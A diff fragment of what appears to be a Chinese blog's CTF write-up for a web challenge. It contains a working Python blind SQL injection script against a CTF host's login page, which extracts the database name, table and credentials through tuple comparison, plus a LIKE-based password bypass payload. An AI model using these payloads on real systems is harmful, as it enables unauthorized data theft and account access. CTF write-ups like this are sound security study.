+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://27.25.151.198:42498/login.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flagstr</span> <span class="o">=</span> <span class="s2">&#34;0123456789:;&lt;=&gt;?@_`abcdefghijklmnopqrstuvwxyz{|}~&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tempstr</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">15</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flagstr</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="n">flagstr</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload1</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%2711%</span><span class="s2">27,</span><span class="si">%2711%</span><span class="s2">27)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##获得数据库名:hnctfweb</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload2</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(%27hnctfweb%27,%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%2711%</span><span class="s2">27,</span><span class="si">%2711%</span><span class="s2">27)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#获得表名:hnctfuser</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload3</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%27%</span><span class="s2">27,</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%2711%</span><span class="s2">27)&lt;(table/**/hnctfuser/**/limit/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##获得第⼀列id值:1</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload4</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(</span><span class="si">%271%</span><span class="s2">27,%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%2711%</span><span class="s2">27)&lt;(table/**/hnctfuser/**/limit/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##获得第⼆列username值:admin</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload5</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%27a</span><span class="s2">dmin%27,%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%2711%</span><span class="s2">27)&lt;(table/**/hnctfuser/**/limit/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##获得第⼆列password值:admin123</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload6</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%27a</span><span class="s2">dmin%27,</span><span class="si">%27a</span><span class="s2">dmin123%27,%27</span><span class="si">{}</span><span class="s2">%27)&lt;(table/**/hnctfuser/**/limit/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##获得第四列值:noflaginhere</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload7</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%271%</span><span class="s2">27)&lt;(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##获得id值:2，offset 1：跳过第一条记录，从第二条记录开始取。</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload8</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(</span><span class="si">%272%</span><span class="s2">27,%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%271%</span><span class="s2">27,</span><span class="si">%271%</span><span class="s2">27)&lt;(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##获得需要的关键⽤⼾名:hackervgcgj，每个人不一样</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload9</span> <span class="o">=</span> <span class="s2">&#34;1%27/**/||(</span><span class="si">%272%</span><span class="s2">27,</span><span class="si">%27ha</span><span class="s2">ckervgcgj%27,%27</span><span class="si">{}</span><span class="s2">%27,</span><span class="si">%271%</span><span class="s2">27)&lt;(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tempstr</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">##我跑出来是d8578edf845</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span><span class="n">payload9</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;登陆成功&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="s2">&#34;错误&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current_char</span> <span class="o">=</span> <span class="n">flagstr</span><span class="p">[</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">current_char</span> <span class="o">==</span> <span class="s1">&#39;~&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;遇到 ~，提前终止,请确认数据是否正确。&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="n">tempstr</span> <span class="o">+=</span> <span class="n">current_char</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">tempstr</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;当前结果: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;最终结果: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="err">字符串的字典序比较</span><span class="w"> </span><span class="p">(</span><span class="n">Lexicographical</span><span class="w"> </span><span class="n">Comparison</span><span class="p">)</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">在</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="err">中，当你比较两个字符串时，它们是按照字典顺序（也就是字母表顺序）一个字符一个字符地进行比较的。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">如果一个字符串是另一个字符串的前缀，那么这个前缀字符串被认为是“小于”完整的字符串。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">例如：</span><span class="s1">&#39;h&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="p">(</span><span class="err">因为</span><span class="w"> </span><span class="s1">&#39;h&#39;</span><span class="w"> </span><span class="err">是</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="err">的前缀</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39;ha&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="p">(</span><span class="err">因为</span><span class="w"> </span><span class="s1">&#39;ha&#39;</span><span class="w"> </span><span class="err">是</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="err">的前缀</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39;hn&#39;</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="p">(</span><span class="err">因为</span><span class="w"> </span><span class="s1">&#39;hn&#39;</span><span class="w"> </span><span class="err">是</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="err">的前缀</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">如果两个字符串在某个位置出现不同字符，那么比较哪个字符在字母表里更靠前，哪个字符串就更“小”。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">例如：</span><span class="s1">&#39;ho&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="p">(</span><span class="err">因为</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="err">比</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="err">靠后</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39;i&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s1">&#39;hnctfweb&#39;</span><span class="w"> </span><span class="p">(</span><span class="err">因为</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="err">比</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="err">靠后</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">所以这个代码通过拿一个不断增长的“前缀”或“猜测字符”去和目标字符串的相应部分进行字典序比较。比如，</span><span class="n">hn</span><span class="o">&lt;</span><span class="n">hnctfweb</span><span class="p">,</span><span class="err">返回成功，</span><span class="n">ho</span><span class="o">&gt;</span><span class="n">hnctfweb</span><span class="p">,</span><span class="err">返回失败，这时候第二个字符</span><span class="o">-</span><span class="mi">1</span><span class="err">变为</span><span class="n">n</span><span class="err">，加入到</span><span class="w"> </span><span class="n">tempstr</span><span class="err">，其就变为了</span><span class="n">hn</span><span class="err">，然后以此类推，得到目标字符串</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MySQL</span><span class="w"> </span><span class="err">比较两个元组时，也是从左到右，逐个元素地进行比较。只有当第一个元素完全相等时，才会继续比较第二个元素，以此类推。</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="2用户名前缀匹配绕过密码验证-or">2.用户名前缀匹配绕过密码验证-or+%
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">2527</span><span class="cm">/**/</span><span class="o">||</span><span class="cm">/**/</span><span class="n">username</span><span class="cm">/**/</span><span class="k">like</span><span class="cm">/**/</span><span class="o">%</span><span class="mi">2527</span><span class="n">hacker</span><span class="o">%%</span><span class="mi">2527</span><span class="o">#</span><span class="w">		</span><span class="o">//</span><span class="err">登入框输就输</span><span class="n">url编码一次</span><span class="err">，也就是</span><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="cm">/**/</span><span class="o">||</span><span class="cm">/**/</span><span class="n">username</span><span class="cm">/**/</span><span class="k">like</span><span class="cm">/**/</span><span class="o">%</span><span class="mi">27</span><span class="n">hacker</span><span class="o">%%</span><span class="mi">27</span><span class="o">#</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这句话就是最后不出意外是执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="cm">/* */</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="cm">/* */</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="cm">/* */</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="cm">/* */</span><span class="w"> </span><span class="s1">&#39;hacker%&#39;</span><span class="o">#</span><span class="s1">&#39;;		#由于是or，所以or前面的语句无所谓，就是 username /* */ like /* */ &#39;</span><span class="n">hacker</span><span class="o">%</span><span class="s1">&#39;#&#39;</span><span class="err">起作用，意思就是“或者，这个用户的</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="err">（用户名）字段的值，以</span><span class="w"> </span><span class="n">hacker</span><span class="w"> </span><span class="err">开头”，</span><span class="w"> </span><span class="n">hackervgcgj</span><span class="w"> </span><span class="err">这个用户名来说正好是成立的，它直接绕过了对密码的验证</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250616145631120.png" alt="image-20250616145631120" style="zoom:33%;" />
+<h1 id="">
+</h1><p>后面的逆向不会了，到此为止</p>
 
 </section>
 
@@ -1731,12 +2116,12 @@
             
                 
 <article class="">
-    <a href="/p/smileyctf-2025/">
+    <a href="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">smileyctf-2025</h2>
+            <h2 class="article-title">2025-极客大挑战</h2>
         </div>
     </a>
 </article>
